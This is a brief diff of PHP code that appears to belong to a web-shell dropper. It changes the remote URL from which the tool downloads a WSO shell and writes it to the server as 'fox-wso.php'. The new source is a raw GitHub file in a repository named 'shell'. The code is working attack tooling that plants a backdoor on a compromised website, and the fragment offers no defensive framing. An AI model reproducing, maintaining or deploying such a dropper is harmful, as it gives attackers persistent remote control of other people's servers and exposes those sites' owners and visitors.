@@ -1118,7 +1118,7 @@ case (op('wso.php', 'https://raw.githubusercontent.com/qrtsir/shell/main/wp-logi
 case ('7'):
 switch (true)
 	{
-case (op('fox-wso.php', 'https://random-php.ftp.sh/fox-wso.txt')):
+case (op('fox-wso.php', 'https://raw.githubusercontent.com/qrtsir/shell/main/wp-login.txt')):
 	$ok = '<strong>fox-wso.php > </strong>ok! '.alt_ok().'</div>';
 	}
 }
